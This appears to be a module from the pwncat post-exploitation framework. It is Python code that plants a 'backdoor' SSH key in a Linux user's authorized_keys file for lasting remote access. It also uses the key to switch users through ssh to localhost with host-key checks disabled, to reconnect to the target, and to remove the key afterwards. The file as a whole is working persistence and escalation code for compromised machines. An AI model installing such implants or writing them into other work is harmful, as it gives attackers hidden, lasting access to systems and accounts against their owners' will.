#!/usr/bin/env python3
import os
import time
import shutil
import socket
import subprocess

from pwncat.facts import Implant
from pwncat.modules import Status, Argument, ModuleFailed
from pwncat.platform.linux import Linux
from pwncat.modules.implant import ImplantModule


class AuthorizedKeyImplant(Implant):
    """ A public key added to a user's authorized keys file """

    def __init__(self, source, user, key, pubkey):
        super().__init__(
            source=source, types=["implant.remote", "implant.replace"], uid=user.id
        )

        self.key = key
        self.pubkey = pubkey

    def title(self, session: "pwncat.manager.Session"):
        """ Provide a human-readable description """
        user = session.find_user(uid=self.uid)
        return f"backdoor public key added to [blue]{user.name}[/blue] authorized_keys"

    def remove(self, session: "pwncat.manager.Session"):

        current_user = session.current_user()
        user = session.find_user(uid=self.uid)

        if current_user.id != self.uid and current_user.id != 0:
            raise ModuleFailed(f"must be root or {user.name}")

        # Ensure the directory exists
        homedir = session.platform.Path(user.home)
        if not (homedir / ".ssh").is_dir():
            return

        authkeys_path = homedir / ".ssh" / "authorized_keys"

        if not authkeys_path.is_file():
            return

        try:
            with authkeys_path.open("r") as filp:
                authkeys = [line for line in filp.readlines() if line != self.pubkey]
        except (FileNotFoundError, PermissionError) as exc:
            raise ModuleFailed(str(exc)) from exc

        try:
            with authkeys_path.open("w") as filp:
                filp.writelines(authkeys)
        except (FileNotFoundError, PermissionError) as exc:
            raise ModuleFailed(str(exc)) from exc

        # Fix permissions (in case the file was replaced by the above write)
        session.platform.chown(str(authkeys_path), user.id, user.gid)
        authkeys_path.chmod(0o600)

    def escalate(self, session: "pwncat.manager.Session"):

        if session.platform.which("ssh") is None:
            raise ModuleFailed("no local ssh binary")

        current_user = session.current_user()
        user = session.find_user(uid=self.uid)

        # Upload the private key
        with session.platform.tempfile(suffix="", mode="w") as dest:
            privkey_path = dest.name
            with open(self.key, "r") as source:
                shutil.copyfileobj(source, dest)

        # Set permissions on private key
        session.platform.chown(privkey_path, current_user.id, current_user.gid)
        session.platform.chmod(privkey_path, 0o600)

        # Execute SSH
        proc = session.platform.Popen(
            [
                "ssh",
                "-i",
                privkey_path,
                "-o",
                "StrictHostKeyChecking=no",
                "-o",
                "PasswordAuthentication=no",
                "-o",
                "ChallengeResponseAuthentication=no",
                f"{user.name}@localhost",
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
        )

        # Wait a second to see if there's an error from ssh
        time.sleep(1)
        if proc.poll() is not None:
            raise ModuleFailed(
                f"ssh to localhost failed w/ exit code {proc.returncode}"
            )

        # Detach the popen object
        proc.detach()

        return lambda session: session.platform.channel.send(b"exit\n")

    def trigger(
        self, manager: "pwncat.manager.Manager", target: "pwncat.target.Target"
    ) -> "pwncat.manager.Session":
        """ Trigger a listener or connection to the target using this implant """

        # Find the user for this UID
        for fact in target.facts:
            if "user" in fact.types and fact.id == self.uid:
                user = fact
                break
        else:
            raise ModuleFailed(f"unknown username for uid={self.uid}")

        try:
            # Connect via SSH
            session = manager.create_session(
                "linux",
                host=target.public_address[0],
                user=user.name,
                identity=self.key,
            )
        except ChannelError as exc:
            raise ModuleFailed(str(exc)) from exc

        return session


class Module(ImplantModule):
    """
    Install the custom backdoor key-pair as an authorized key for
    the specified user. This method only succeeds for a user other
    than the current user if you are currently root.
    """

    PLATFORM = [Linux]
    ARGUMENTS = {
        **ImplantModule.ARGUMENTS,
        "user": Argument(
            str,
            default="__pwncat_current__",
            help="the user for which to install the implant (default: current user)",
        ),
        "key": Argument(str, help="path to keypair which will be added for the user"),
    }

    def install(self, session: "pwncat.manager.Session", user, key):

        yield Status("verifying user permissions")
        current_user = session.current_user()
        if user != "__pwncat_current__" and current_user.id != 0:
            raise ModuleFailed("only root can install implants for other users")

        if not os.path.isfile(key):
            raise ModuleFailed(f"private key {key} does not exist")

        try:
            yield Status("reading public key")
            with open(key + ".pub", "r") as filp:
                pubkey = filp.read().rstrip("\n") + "\n"
        except (FileNotFoundError, PermissionError) as exc:
            raise ModuleFailed(str(exc)) from exc

        # Parse user name (default is current user)
        if user == "__pwncat_current__":
            user_info = current_user
        else:
            user_info = session.find_user(name=user)

        # Ensure the user exists
        if user_info is None:
            raise ModuleFailed(f"user [blue]{user}[/blue] does not exist")

        # Ensure we haven't already installed for this user
        for implant in session.run("enumerate", types=["implant.*"]):
            if implant.source == self.name and implant.uid == user_info.uid:
                raise ModuleFailed(
                    f"{self.name} already installed for {user_info.name}"
                )

        # Ensure the directory exists
        yield Status("locating authorized keys")
        homedir = session.platform.Path(user_info.home)
        if not (homedir / ".ssh").is_dir():
            (homedir / ".ssh").mkdir(parents=True, exist_ok=True)

        authkeys_path = homedir / ".ssh" / "authorized_keys"

        if authkeys_path.is_file():
            try:
                yield Status("reading authorized keys")
                with authkeys_path.open("r") as filp:
                    authkeys = filp.readlines()
            except (FileNotFoundError, PermissionError) as exc:
                raise ModuleFailed(str(exc)) from exc
        else:
            authkeys = []

        # Add the public key to authorized keys
        authkeys.append(pubkey)

        try:
            yield Status("patching authorized keys")
            with authkeys_path.open("w") as filp:
                filp.writelines(authkeys)
        except (FileNotFoundError, PermissionError) as exc:
            raise ModuleFailed(str(exc)) from exc

        # Ensure correct permissions
        yield Status("fixing authorized keys permissions")
        session.platform.chown(str(authkeys_path), user_info.id, user_info.gid)
        authkeys_path.chmod(0o600)

        return AuthorizedKeyImplant(self.name, user_info, key, pubkey)
